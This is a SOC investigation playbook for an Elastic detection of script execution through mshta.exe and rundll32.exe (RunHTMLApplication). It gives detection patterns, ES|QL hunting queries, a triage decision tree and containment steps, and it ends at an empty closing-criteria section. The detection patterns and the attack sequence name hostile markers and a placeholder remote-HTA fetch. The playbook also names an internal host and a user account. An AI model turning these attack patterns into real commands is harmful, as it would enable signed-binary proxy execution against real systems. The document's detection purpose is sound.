# Script Execution via Microsoft HTML Application [NBI-4688] — SOC Investigation Playbook

**Rule ID:** `nbi-b2-script-execution-via-microsoft-html-application` · **Type:** eql · **Language:** eql · **Severity:** High · **Confidence:** Medium · **Platform:** Elastic Security (NBI)
**Primary index (live):** `logs-system.security-*` (Windows Security Event 4688) · **Alert entities:** `$host`, `$user`, `$process`, `$suspicious_pid`, `$source_ip`

> Substitute the alert's real values for the `$vars` before running any query. This playbook was authored and live-validated against NBI telemetry with `$host = nim-fti-apv01`, `$user = IBC.MohamadChbaro`, `$process = mshta.exe`, `$suspicious_pid = 780`, `$source_ip = 10.11.18.21` (a real application-server host with dense 4688 process-creation telemetry and a real named interactive account, used to prove each pivot executes). The `$suspicious_pid` used for validation is a real parent PID on that host so the lineage walk returns data. Every ES|QL block below returned successfully on the live NBI cluster; the `mshta.exe`/`rundll32.exe` script-marker anchor returns 0 rows because mshta is absent and no rundll32 script markers are present in NBI's live window (the honest zero baseline), and **empty result never means safe**.

---

## 1. Purpose

This playbook drives triage and investigation of the **Script Execution via Microsoft HTML Application** detection on NBI's Elastic Security deployment. The rule fires when **`mshta.exe` or `rundll32.exe` runs script through the Microsoft HTML-application engine** — inline VBScript/JScript (`GetObject`, `WScript.Shell`, `.run(`, `.Exec()`, `RegRead`/`RegWrite`, `StrReverse`, `eval(`), the `mshtml` `RunHTMLApplication` entry point (the classic `rundll32 … mshtml,RunHTMLApplication`), a remote HTA over `http(s)`, or an HTA opened from a download/archive path. Legitimate `wfshell.exe`/`MSACCESS.EXE`/`GTInstaller.exe` parents are excluded by the deployed rule.

This is a classic **signed-binary script-execution and defence-evasion** technique used in phishing and malware loaders: attacker code runs under a Microsoft-signed binary, bypassing application controls and many AV signatures. The analyst's job is to decide whether this is a rare-but-sanctioned application/installer behaviour (**false_positive, authorised**), malicious HTA/script execution driven by phishing or a loader (**true_positive**), an unbaselined line-of-business HTA app (**misconfiguration**), or unproven (**needs_escalation**). The **script payload**, whether the HTA is **remote/download/archive-sourced**, and the **launching parent** (office/browser/mail = phishing) are the discriminators. This analytic is the upstream companion to the mshta child-process detection: here the concern is the script mshta *ran*; there, what it *launched*.

## 2. Detection Summary

The deployed rule is an **EQL** analytic. As characterised by its trigger logic, it fires on a process-creation event where the image is `mshta.exe` or `rundll32.exe`, the command line carries an HTML-application/script marker, and the parent is not one of the excluded application launchers:

```eql
process where host.os.type == "windows" and event.type == "start" and
  process.name : ("mshta.exe", "rundll32.exe") and
  process.command_line : (
    "*RunHTMLApplication*", "*GetObject*", "*WScript.Shell*", "*.RegRead*",
    "*.RegWrite*", "*eval(*", "*StrReverse*", "*mshta*http*", "*.hta*",
    "*.run(*", "*).Exec()*"
  ) and
  not process.parent.name : ("wfshell.exe", "MSACCESS.EXE", "GTInstaller.exe")
```

Plain English: the HTML-application engine executed script — an inline VBScript/JScript command, a remote HTA fetched over HTTP, or an HTA opened from disk — under a signed Windows binary, and not from a recognised application launcher.

The rule keys on Windows Security **4688** (`event.code : "4688"`), which NBI collects, so it is **live-capable** — but it depends entirely on the **command line**, which is only ~50% populated on NBI (§8). The one-line Kibana KQL detection/pivot filter is:

```kql
event.code : "4688" and process.name : ("mshta.exe" or "rundll32.exe") and process.command_line : (*RunHTMLApplication* or *GetObject* or *WScript.Shell* or *.hta* or *mshta*http*) and not process.parent.name : ("wfshell.exe" or "MSACCESS.EXE" or "GTInstaller.exe")
```

In NBI's live window `mshta.exe` is absent and no `rundll32.exe` script markers are present, so the rule should be near-silent; a match is a high-value lead. Where the command line is null the script is **invisible in this index** and must be recovered from the host/EDR — an empty result is the expected zero baseline and is **not** evidence of safety.

## 3. Alert Meaning

An alert means: **on `$host`, `mshta.exe` or `rundll32.exe` executed script through the HTML-application engine**. Both are Microsoft-signed, allow-listed binaries; `mshta.exe` hosts HTA content, and `rundll32.exe mshtml.dll,RunHTMLApplication` is the documented way to run HTA/script without an `.hta` file at all. Adversaries use either to run VBScript/JScript that downloads and executes the next stage — from a phishing document macro, a `mshta http://…` link, or an HTA delivered in an archive.

The logon/render step is not itself malicious; the **script content and its source** are the signal. The investigative questions are: **what does the script do** (fetch over HTTP? execute a command via `WScript.Shell`/`.Exec()`? obfuscate with `StrReverse`/`eval`?), **where did the HTA come from** (remote, download, archive, or a local application directory), and **what launched the engine** (an office/browser/mail/explorer parent is the phishing chain; a recognised installer parent is the benign case the rule already tries to exclude).

## 4. Typical Attacker Behavior

The technique proceeds in a recognisable sequence:

1. The victim is phished — a macro-enabled document, a link, or an archive attachment.
2. The document/macro (or the user opening an `.hta`) launches `mshta.exe http://attacker/stage.hta`, or `rundll32.exe mshtml.dll,RunHTMLApplication <script>`, or an inline VBScript/JScript one-liner.
3. The HTML-application engine executes the script: `GetObject`/`WScript.Shell` to spawn a command, `.Exec()`/`.run(` to launch a payload, `RegRead`/`RegWrite` to read/persist, often obfuscated with `StrReverse`/`eval`. A remote HTA is fetched over HTTP first.
4. The script **downloads and runs the next stage** and/or **establishes persistence**, then the operator pursues credential theft and lateral movement.

Follow-on tradecraft to expect on the same host/user in the window: an office/browser/mail/explorer **parent** for the engine (initial access), a script-chain parent (`wscript`/`cscript`/`powershell`/`cmd`/`mshta`) for multi-stage loaders, and downstream download/persistence tooling (see the companion mshta child-process analytic).

## 5. Common False Positives

- **Sanctioned local application / installer HTAs.** Some enterprise apps and installers legitimately run a local `.hta` via `mshta.exe`; the deployed rule already excludes the common `wfshell.exe`/`MSACCESS.EXE`/`GTInstaller.exe` launchers. A recognised installer/application parent, a local path, and no remote/obfuscated payload is the benign case — confirmed, not assumed.
- **`rundll32.exe` legitimate uses** unrelated to `mshtml` — most will not carry the script markers and so will not fire; a marker match on rundll32 is unusual.
- **Administrator/vendor configuration scripts** wrapped in an HTA. Confirm against a change record.
- A script/HTA positively proven **blocked or failed** (errored, denied by policy, no download or child activity) is recorded as **blocked-malicious**, never "benign".

## 6. Environment-Specific False Positives (NBI)

Validated against NBI's live `logs-system.security-*`:

- **`mshta.exe` is absent and `rundll32.exe` carries no script markers in NBI's live 4-hour window.** The inline-script/HTA variants this rule isolates are the exception; any match is a high-value lead with **no noisy legitimate source to tune out**.
- **The plausible-legitimate locus is an interactive user or a jump/VDI host** running a genuine local application HTA; the busy servers are dominated by service/machine-account process creation and would not normally run mshta at all.
- **The detection is command-line-bound, and command-line auditing is bimodal (~50%).** Where the GPO is off, the script markers cannot be seen and the rule cannot match — so a quiet host is not a safe host. Recover the script from EDR/host where the command line is null (§8).
- **No historical NBI benign-true-positive is on record for this rule.** There is no environment-specific allow-list to apply; scope any future exception to an exact application HTA + parent + path + host + user (by identity, matching the deployed rule's excluded-parent approach), after a documented owner is confirmed.

## 7. Investigation Prerequisites

- Read-only access to NBI Elastic Security (Discover, Timeline, Alerts) and the `_query` ES|QL API.
- The alert's entity values: `host.name` (`$host`), the acting `user.name` (`$user`), the engine image `process.name` (`$process`, here `mshta.exe`; also consider `rundll32.exe`), the engine `process.pid` for lineage (`$suspicious_pid`), and — if the session is remote — the logon `source.ip` (`$source_ip`).
- Awareness of NBI's telemetry reality (§8): **4688 only, no Sysmon, no Elastic Defend/EDR, no process hashes, and the entire detection depends on host-dependent command-line capture.**
- A tight incident window — every ES|QL block below uses `@timestamp >= NOW() - 4 hours`; widen only in Discover with care, anchored on the alert time.

## 8. Required Data Sources

**Live and used by this playbook:**

- **`logs-system.security-*`** — Windows Security Event Log. Event **4688** (a new process has been created) is the anchor: `event.type = "start"`, provider `Microsoft-Windows-Security-Auditing`. Supporting events used in pivots: **4624/4625/4634/4647** (logon/logoff), **4672** (special privileges), **4698** (scheduled task), **4720** (account created), **7045** (service installed), **5140/5145** (share access), **1102** (log cleared), **4719** (audit policy changed).

**Field population on 4688 (measured live on NBI):**

| Field | Population | Note |
|---|---|---|
| `process.name`, `process.executable` | ~100% | Engine image (`mshta.exe`/`rundll32.exe`) + full path. |
| `process.parent.name`, `process.parent.executable` | ~99.7% | Parent image — the initial-vector discriminator (office/browser/mail vs installer). |
| `process.pid`, `process.parent.pid` | ~100% | **PID-based lineage** (no Sysmon `process.entity_id` on NBI). |
| `user.name`, `winlog.event_data.SubjectUserName` | ~100% | Acting account. |
| `host.name`, `host.os.type` | ~100% | `host.os.type` = `windows`. |
| `process.command_line` | **host-dependent** (~50% estate-wide) | **The detection's core field** — the script markers, remote URL, and HTA path live here. Null where the GPO is off, blinding the rule on that host. |
| `process.args` (multivalued) | tracks `command_line` | Corroborate with `MV_CONCAT(process.args, " ")`; the reused queries concatenate both. |

**Declared/relevant but DEAD in NBI (0 docs — never query; note the capability gap):** `logs-windows.sysmon_operational-*`, `logs-endpoint.events.process-*` (Elastic Defend), `logs-crowdstrike.fdr*`, `winlogbeat-*`, `logs-windows.forwarded*`.

**Telemetry-blocked / partial signals (state plainly):**

- **The detection is only as good as the command line.** Where `process.command_line`/`process.args` are null (bimodal ~50%), the script is invisible in this index — the rule cannot match and the investigation must pull the script from EDR/host. This is the single most important caveat for this rule.
- **No process hashes** (`process.hash.*` absent on 4688), so any dropped payload's reputation must be obtained out of band.
- **No process network/DNS events**, so the remote-HTA fetch destination cannot be pivoted inside `logs-system.security-*` (the URL is only visible if it is in the command line).

Empty result ≠ safe: a null command line, not a proven-benign script, is the usual reason this rule is quiet on a given host.

## 9. MITRE ATT&CK Mapping

From the rule's `threat[]`:

- **Tactic: Defense Evasion (TA0005)** — https://attack.mitre.org/tactics/TA0005/
- **Technique: T1218 — System Binary Proxy Execution** — https://attack.mitre.org/techniques/T1218/
- **Sub-technique: T1218.005 — System Binary Proxy Execution: Mshta** — https://attack.mitre.org/techniques/T1218/005/
- **Sub-technique: T1218.011 — System Binary Proxy Execution: Rundll32** — https://attack.mitre.org/techniques/T1218/011/

Both sub-techniques run attacker script through a signed Microsoft binary (`mshta.exe`; `rundll32.exe mshtml,RunHTMLApplication`), evading application controls while executing code.

## 10. Severity Guidance

Deployed severity is **High** (confidence Medium). Adjust the *effective* incident priority using NBI-specific context:

- **Raise toward critical** when: the script is **remote/download/archive-sourced** (§15.2 payload source), the command line carries `http`/`RunHTMLApplication`/obfuscation (`StrReverse`/`eval`), the **parent** is office/browser/mail/explorer (§15.3, phishing), or follow-on download/persistence is visible (companion analytic / §17.2).
- **Keep at high** for any confirmed inline-script command execution with no authorised explanation.
- **Lower only** to **false_positive** when a recognised local application/installer HTA (matching or resembling the excluded-parent set, local path, no remote/obfuscated payload) is positively evidenced, or the script is proven blocked. Because NBI's baseline is effectively zero, the default posture is "treat as real".

## 11. Triage Process (Tier 1)

Target: reach a hold/confirm/escalate decision in ~15 minutes.

1. **Read the alert entities.** Note `$host`, `$user`, the engine `process.name` (`mshta.exe`/`rundll32.exe`) and its `process.executable`, `$suspicious_pid`, and timestamp.
2. **Confirm the execution and read the script** with §14.1 / §15.1 (HTA-INV-01). A `mshta http://…`, `RunHTMLApplication` with obfuscation, or `GetObject`/`WScript.Shell`/`.run()` command is loader behaviour.
3. **Classify the payload source** with §15.2 (HTA-INV-02): remote-hta / hta-from-download / hta-from-archive / inline-script.
4. **Identify the launching parent** with §15.3 (HTA-INV-03): office/browser/mail/explorer = phishing; script-chain = multi-stage; recognised installer = benign candidate.
5. **Check the command line is even present** — where null, the script is invisible in this index (§8); escalate to EDR/host rather than clearing.
6. **Decide:** remote/delivered HTA or inline command from a phishing parent → escalate to Tier 2 as **true_positive** candidate; recognised local application HTA + no remote/obfuscated payload → **false_positive (authorised)**; recognised-but-unbaselined app → **misconfiguration**; unrecoverable script/parent → **needs_escalation**. Never close as benign without proof.

## 12. Investigation Workflow (Tier 2 / Tier 3)

1. **Confirm and read the script** (§15.1) — the primary true-positive-vs-false-positive input; the reused query concatenates `process.command_line` and `MV_CONCAT(process.args," ")` so the markers surface wherever either is populated.
2. **Classify the payload source** (§15.2) — remote/download/archive vs inline command execution.
3. **Pin the initial vector** (§15.3) — office/browser/mail/explorer parent = phishing; script-chain = loader; verify a claimed installer parent against the deployed rule's excluded set.
4. **Scope the user and host** (§15.4, §15.5) and the session origin (§15.6, §15.12); walk the engine's descendants by PID (§15.3b, §17.5).
5. **Validate downstream** (§17) — download/persistence follow-on, privilege context, defence evasion, and what the engine PID spawned; correlate with the companion mshta child-process analytic.
6. **Build the timeline** (§16) and escalate to Tier 3 / IR per §21 when malicious script execution is confirmed.

## 13. Decision Tree

```
Alert: mshta/rundll32 ran HTML-application script on $host (§14 confirms the 4688 + markers)
│
├─ Command line null on $host (bimodal auditing) → script invisible in this index
│     → do NOT clear; pull the script from EDR/host → needs_escalation if unrecoverable
│
├─ Script recovered → assess payload source + parent
│   │
│   ├─ Recognised local application/installer HTA (excluded-style parent, local path,
│   │   no remote/obfuscated payload) — evidenced, not assumed
│   │     → false_positive (authorised application HTA) — document the owner
│   │
│   ├─ Legitimate LOB application uses HTA/mshta but was not yet baselined/excluded
│   │     → misconfiguration — baseline/exclude by identity; recommend migrating off mshta
│   │
│   ├─ Script/HTA positively proven blocked/failed (no download, no child activity)
│   │     → false_positive (blocked-malicious) — documented as blocked, never "benign"
│   │
│   └─ Remote/download/archive HTA OR inline command execution, launched by an
│       office/browser/mail/explorer parent (§15.3)
│         → true_positive — proceed to Containment (§18); escalate per §21
│
└─ Script payload and parent cannot be recovered
      → needs_escalation — hand to Tier 3/IR with the gaps noted
```

## 14. Validation Queries

### 14.1 Confirm on the alert host (faithful reproduction of the rule's markers)

Reused from the deployed playbook (HTA-INV-01), verbatim — the faithful host-scoped reproduction of the deployed detection. Recovers the `mshta`/`rundll32` command line(s) on `$host` that carry inline-script or HTA markers, concatenating `process.command_line` and `process.args` so a marker surfaces wherever either is populated.

```esql
FROM logs-system.security-*
| WHERE event.code == "4688" AND host.name == "$host"
    AND TO_LOWER(process.name) IN ("mshta.exe", "rundll32.exe")
    AND @timestamp >= NOW() - 4 hours
| EVAL cl = TO_LOWER(CONCAT(COALESCE(process.command_line, ""), " ", COALESCE(MV_CONCAT(process.args, " "), "")))
| WHERE cl LIKE "*runhtmlapplication*" OR cl LIKE "*getobject*" OR cl LIKE "*wscript.shell*" OR cl LIKE "*.regread*" OR cl LIKE "*.regwrite*" OR cl LIKE "*eval(*" OR cl LIKE "*strreverse*" OR cl LIKE "*mshta*http*" OR cl LIKE "*.hta*" OR cl LIKE "*.run(*" OR cl LIKE "*).exec()*"
| KEEP @timestamp, host.name, user.name, process.name, process.parent.name, process.command_line, process.args
| SORT @timestamp DESC
| LIMIT 20
```

### 14.2 Estate-wide engine prevalence (context for the zero baseline)

Counts `mshta.exe`/`rundll32.exe` executions and their parents across the estate — no marker `LIKE`, so it is safe on the full index. Establishes how (un)usual the engine is and which parents launch it, against which any marker match stands out.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND TO_LOWER(process.name) IN ("mshta.exe", "rundll32.exe")
| STATS executions = COUNT(*), hosts = COUNT_DISTINCT(host.name), users = COUNT_DISTINCT(user.name) BY process.name, process.parent.name
| SORT executions DESC
| LIMIT 50
```

## 15. Investigation Queries — Entity Pivots

### 15.1 Entity pivoting

Anchor on the alert's entity set: retrieve all `mshta`/`rundll32` executions on `$host` with the full 4688 field set (no marker filter, so entities are captured even where the command line is null), confirming every downstream `$var` (engine image, path, pid, parent pid, user).

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
    AND TO_LOWER(process.name) IN ("mshta.exe", "rundll32.exe")
| KEEP @timestamp, host.name, user.name, process.name, process.executable, process.parent.name, process.pid, process.parent.pid, process.command_line
| SORT @timestamp DESC
| LIMIT 50
```

### 15.2 Process investigation

**15.2a — Classify the payload source.** Reused from the deployed playbook (HTA-INV-02), verbatim. Buckets whether the HTA/script is remote, download/archive-delivered, or inline — each maps to a different threat story.

```esql
FROM logs-system.security-*
| WHERE event.code == "4688" AND host.name == "$host"
    AND TO_LOWER(process.name) IN ("mshta.exe", "rundll32.exe")
    AND @timestamp >= NOW() - 4 hours
| EVAL cl = TO_LOWER(CONCAT(COALESCE(process.command_line, ""), " ", COALESCE(MV_CONCAT(process.args, " "), "")))
| WHERE cl LIKE "*.hta*" OR cl LIKE "*runhtmlapplication*" OR cl LIKE "*getobject*" OR cl LIKE "*wscript.shell*" OR cl LIKE "*eval(*" OR cl LIKE "*http*"
| EVAL payload_source = CASE(
    cl LIKE "*mshta*http*" OR cl LIKE "*runhtmlapplication*", "remote-hta-or-inline-rundll",
    cl LIKE "*downloads*", "hta-from-download",
    cl LIKE "*7z*" OR cl LIKE "*rar$*" OR cl LIKE "*temp?_*" OR cl LIKE "*bnz.*", "hta-from-archive",
    cl LIKE "*getobject*" OR cl LIKE "*wscript.shell*" OR cl LIKE "*.run(*" OR cl LIKE "*eval(*" OR cl LIKE "*strreverse*", "inline-script",
    "other")
| STATS execs = COUNT(*) BY payload_source, process.name, process.parent.name
| SORT execs DESC
| LIMIT 20
```

**15.2b — Command-line enrichment of the engine where the host audits it.** Surfaces the full engine command line via `MV_CONCAT` and honestly returns nothing on command-line-less hosts. The remote URL, HTA path, and inline script live here.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
    AND TO_LOWER(process.name) IN ("mshta.exe", "rundll32.exe")
    AND process.args IS NOT NULL
| EVAL arguments = MV_CONCAT(process.args, " ")
| KEEP @timestamp, user.name, process.name, process.parent.name, process.executable, arguments
| SORT @timestamp DESC
| LIMIT 50
```

### 15.3 Parent-Child process analysis

**15.3a — Identify the launching parent (the initial vector).** Reused from the deployed playbook (HTA-INV-03), verbatim. Determines what launched the engine for `$user` — an office/browser/mail parent points to phishing; a recognised installer parent points to benign use.

```esql
FROM logs-system.security-*
| WHERE event.code == "4688" AND host.name == "$host" AND user.name == "$user"
    AND TO_LOWER(process.name) IN ("mshta.exe", "rundll32.exe")
    AND @timestamp >= NOW() - 4 hours
| EVAL cl = TO_LOWER(CONCAT(COALESCE(process.command_line, ""), " ", COALESCE(MV_CONCAT(process.args, " "), "")))
| WHERE cl LIKE "*.hta*" OR cl LIKE "*runhtmlapplication*" OR cl LIKE "*getobject*" OR cl LIKE "*wscript.shell*" OR cl LIKE "*eval(*" OR cl LIKE "*http*"
| EVAL parent_class = CASE(
    TO_LOWER(process.parent.name) IN ("winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe", "onenote.exe"), "office",
    TO_LOWER(process.parent.name) IN ("chrome.exe", "msedge.exe", "firefox.exe", "iexplore.exe", "brave.exe"), "browser",
    TO_LOWER(process.parent.name) == "explorer.exe", "explorer-user-clicked",
    TO_LOWER(process.parent.name) IN ("wscript.exe", "cscript.exe", "powershell.exe", "cmd.exe", "mshta.exe"), "script-chain",
    "other")
| STATS execs = COUNT(*) BY parent_class, process.parent.name
| SORT execs DESC
| LIMIT 20
```

**15.3b — Walk the engine's descendants by PID.** NBI has no Sysmon `process.entity_id`, so lineage is reconstructed by joining `process.parent.pid` to the engine's `process.pid` (`$suspicious_pid`) within a tight window. Corroborate with `process.parent.name` because PIDs are reused. Populate `$suspicious_pid` from the engine `process.pid` in §15.1.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
    AND process.parent.pid == $suspicious_pid
| KEEP @timestamp, user.name, process.parent.name, process.parent.pid, process.name, process.pid, process.executable
| SORT @timestamp ASC
| LIMIT 100
```

### 15.4 User investigation

Where has `$user` executed processes, and how broad is their footprint in the window? A normally host-bound user suddenly spanning multiple hosts is itself suspicious.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND user.name == "$user"
| STATS executions = COUNT(*), distinct_procs = COUNT_DISTINCT(process.name) BY host.name
| SORT executions DESC
| LIMIT 20
```

### 15.5 Host investigation

Baseline the host by surfacing its **rarest** process/parent pairs first — the HTML-application engines and one-off tooling stand out against routine session churn.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
| STATS executions = COUNT(*), users = COUNT_DISTINCT(user.name) BY process.name, process.parent.name
| SORT executions ASC
| LIMIT 40
```

### 15.6 IP investigation

**15.6a — Where did `$user` log in from on `$host`.** `source.ip` is present on network (type 3) and RemoteInteractive/RDP (type 10) logons; it is null on local interactive (type 2). This reveals the operator's origin for the session in which the script ran.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4624"
    AND host.name == "$host" AND user.name == "$user"
    AND source.ip IS NOT NULL
| STATS logons = COUNT(*) BY source.ip, winlog.event_data.LogonType
| SORT logons DESC
| LIMIT 20
```

**15.6b — Reverse pivot on the source IP.** Who else authenticated from `$source_ip`? In NBI a single egress IP frequently fronts many users (shared VDI/admin infrastructure), so treat `source.ip` as a weak individual identifier and always correlate IP + user + host.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4624"
    AND source.ip == "$source_ip"
| STATS logons = COUNT(*) BY user.name, host.name, winlog.event_data.LogonType
| SORT logons DESC
| LIMIT 25
```

### 15.7 Domain investigation

N/A — DNS/network-domain telemetry is not collected for NBI Windows hosts. There is no Sysmon (`logs-windows.sysmon_operational-*` dead), no Elastic Defend network/DNS events (`logs-endpoint.events.network*` dead), and Windows Security 4688 carries no domain-contacted field. The domain a remote HTA was fetched from cannot be resolved from `logs-system.security-*`. Alternative: pivot on the host's IP in `logs-fortinet_fortigate.log-*` out of band.

### 15.8 URL investigation

N/A as a structured field — there is no URL field on Windows Security 4688 and no proxy/EDR web index tied to `$host`. The remote-HTA URL (`mshta http://…`) appears **inside the command line** and is recovered from §15.2b (`MV_CONCAT(process.args," ")`) / §14.1 where the host audits the command line; correlate it against perimeter web/proxy logs (`logs-fortinet_fortigate.log-*` / FortiWeb under `logs-tcp.generic-*`) by the host IP out of band.

### 15.9 Hash investigation

N/A — process hashes are not collected. `process.hash.*` does not exist on 4688 (no Sysmon/EDR on NBI). Reputation lookups cannot be driven from telemetry. Alternative: obtain the SHA-256 of the engine binary and of any payload the script fetched directly from `$host` with PowerShell `Get-FileHash`, then check reputation out of band — the signed engine is not the artifact; the fetched/dropped payload is.

### 15.10 File investigation

Enumerate the distinct on-disk image paths of the alert engine `$process` on `$host`. `mshta.exe`/`rundll32.exe` normally run from `System32`/`SysWOW64`; a copied or renamed engine in a user-writable path is a strong evasion signal. Host+image-scoped, so it is safe.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
    AND TO_LOWER(process.name) == "$process"
| STATS executions = COUNT(*), first_seen = MIN(@timestamp), last_seen = MAX(@timestamp) BY process.executable
| SORT executions DESC
| LIMIT 30
```

The HTA/script file itself and any payload it fetched are not Windows Security artifacts — recover them from the host, using the command-line path from §15.2b as the lead.

### 15.11 Email investigation

N/A — no email/message telemetry is in scope for this host-based execution alert on NBI. There is no live O365/Exchange message index (`logs-m365_defender.*` carries alerts only, not mail items). Alternative: because HTA/mshta payloads are overwhelmingly phishing-delivered, pivot in the mail-security stack out of band using `$user` as the recipient and the incident timeframe to find the delivering message/attachment/link.

### 15.12 Authentication investigation

Reconstruct `$user`'s logon/logoff activity on `$host` to bound the session in which the script ran and spot anomalies (e.g. a service/network logon type where an interactive one is expected).

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code IN ("4624", "4625", "4634", "4647")
    AND host.name == "$host" AND user.name == "$user"
| STATS events = COUNT(*), first_seen = MIN(@timestamp), last_seen = MAX(@timestamp) BY event.code, winlog.event_data.LogonType, source.ip
| SORT events DESC
| LIMIT 30
```

## 16. Timeline Reconstruction

Build a time-ordered process-creation stream for `$user` on `$host`. Because `process.pid`/`process.parent.pid` are ~100% populated, the chain is legible directly, letting you place `parent → mshta/rundll32 → descendants` in sequence with surrounding activity. Anchor on the alert timestamp and read outward.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
    AND user.name == "$user"
| KEEP @timestamp, process.parent.name, process.parent.pid, process.name, process.pid, process.executable
| SORT @timestamp ASC
| LIMIT 200
```

For a broader host timeline (all users), drop the `user.name` predicate. If the host lacks command-line auditing, lineage + image paths are your narrative; the script command line will be null.

## 17. Attack-Chain Validation

### 17.1 Lateral movement validation

Did `$user` authenticate or reach shares on hosts **other than** `$host` in the window? Network/explicit-credential logons and Kerberos ticketing to new systems after the script execution are the signal. Expect some legitimate DC ticketing for normal users; weigh it against role.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code IN ("4624", "4648", "4768", "4769", "5140")
    AND user.name == "$user"
    AND host.name != "$host"
| STATS events = COUNT(*) BY host.name, event.code, winlog.event_data.LogonType
| SORT events DESC
| LIMIT 30
```

### 17.2 Persistence validation

Look for persistence primitives on `$host` in the window — the download/persistence tooling an HTA loader spawns, plus service installs (`7045`), scheduled tasks (`4698`), and account creation (`4720`).

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND host.name == "$host"
    AND (
        (event.code == "4688" AND TO_LOWER(process.name) IN ("schtasks.exe", "reg.exe", "sc.exe", "certutil.exe", "bitsadmin.exe", "curl.exe", "powershell.exe", "wscript.exe", "cscript.exe", "rundll32.exe"))
        OR event.code == "7045"
        OR event.code == "4720"
        OR event.code == "4698"
    )
| STATS events = COUNT(*) BY event.code, process.name, user.name
| SORT events DESC
| LIMIT 40
```

### 17.3 Privilege escalation validation

Enumerate which accounts received **special (admin-equivalent) privileges** on `$host` via Event 4672, and compare against `$user`. A script that escalates or runs elevated is a materially worse incident; a non-privileged `$user` executing HTML-application script is the common loader shape.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4672"
    AND host.name == "$host"
| STATS special_priv_logons = COUNT(*) BY user.name
| SORT special_priv_logons DESC
| LIMIT 25
```

### 17.4 Defense evasion validation

Check for evidence-destruction / defence-tampering on `$host`: event-log clearing (`1102`), audit-policy change (`4719`), and 4688 executions of `wevtutil.exe`/`fsutil.exe`/`vssadmin.exe`/`wmic.exe`/`cipher.exe`. Signed-binary script proxy execution is itself a defence-evasion technique; absence of cleanup evidence is not exoneration.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND host.name == "$host"
    AND (
        (event.code == "4688" AND TO_LOWER(process.name) IN ("wevtutil.exe", "fsutil.exe", "vssadmin.exe", "wmic.exe", "cipher.exe", "sdelete.exe", "sdelete64.exe"))
        OR event.code == "1102"
        OR event.code == "4719"
    )
| STATS events = COUNT(*) BY event.code, process.name, user.name
| SORT events DESC
| LIMIT 30
```

### 17.5 Impact assessment

Quantify what the engine actually did by enumerating everything it spawned (its descendants by PID). A `mshta`/`rundll32` that then launches recon, credential, download, or persistence tooling is a materially different incident from one that spawned nothing. Populate `$suspicious_pid` from the engine `process.pid` in §15.1.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND host.name == "$host"
    AND event.code == "4688"
    AND process.parent.pid == $suspicious_pid
| STATS children = COUNT(*), distinct_children = COUNT_DISTINCT(process.name) BY process.name
| SORT children DESC
| LIMIT 30
```

## 18. Containment

- **Isolate `$host`** (network-contain / quarantine) if a true_positive is confirmed, to stop the script fetching further stages and moving on. Coordinate with IT on shared hosts but prioritise containment.
- **Suspend or force-logoff `$user`'s session** on `$host` and **disable the account** pending investigation; reset its credentials (§20).
- **Terminate the engine process and its descendants** (`$suspicious_pid` tree from §15.3b / §17.5).
- **Preserve volatile evidence first** where feasible: running process list, the HTA/script file, any payload it fetched, and memory of the engine. NBI does not collect the script content (unless in the command line) or the network fetch, so host-side capture is the only way to recover them.
- Deploy/confirm changes only via the authorised human-approved DEPLOY path; investigation itself is read-only.

## 19. Eradication

- **Remove the persistence** discovered in §17.2 (scheduled tasks, Run keys, services) and any dropped payload the script fetched.
- **Delete the HTA/script and any second-stage binaries**, recovered host-side.
- **Run a full anti-malware / EDR scan** on `$host` and hunt for the same script/HTA and the mshta/rundll32-with-markers pattern across peers — especially any host `$user` touched (§15.4, §17.1).
- **Remediate the initial-access vector** — the phishing message/attachment (§15.11) and the office/browser/mail/explorer parent that launched the engine (§15.3).

## 20. Recovery

- **Reset `$user`'s password** and any credentials accessible from `$host` during the intrusion window; if privileged accounts logged on there (§17.3), rotate those too.
- **Restore `$host`** from a known-good image if the loader established persistence or dropped multiple stages; otherwise validate that all eradication actions hold after reboot.
- **Return the host/account to service** only after §22 closing criteria are met and monitoring confirms the engine does not recur with script markers.
- **Harden.** Block or restrict `mshta.exe` by policy (WDAC/AppLocker), alert on office/browser parents spawning `mshta`/`rundll32`, strip HTA attachments at the mail gateway, and — critically for this rule — enable command-line auditing on the host class so the script is actually visible to the detection.

## 21. Escalation Criteria

Escalate to Tier 3 / Incident Response (and notify the customer) when **any** of the following hold:

- The script is **remote/download/archive-sourced** or an inline command execution (§15.2), especially with obfuscation (`StrReverse`/`eval`).
- The engine's **parent** is office/browser/mail/explorer (§15.3) — an active phishing chain.
- Download/persistence **follow-on** is present (§17.2), or the engine spawned further tooling (§17.5).
- Lateral movement from `$host`/`$user` is observed (§17.1), especially toward domain controllers or other privileged systems.
- The acting account is privileged/service, or log clearing / audit-policy tampering appears (§17.4).
- Evidence is incomplete because the command line is null on this host (script invisible in-index) and cannot be recovered — escalate as **needs_escalation** with the gap named.

## 22. Closing Criteria

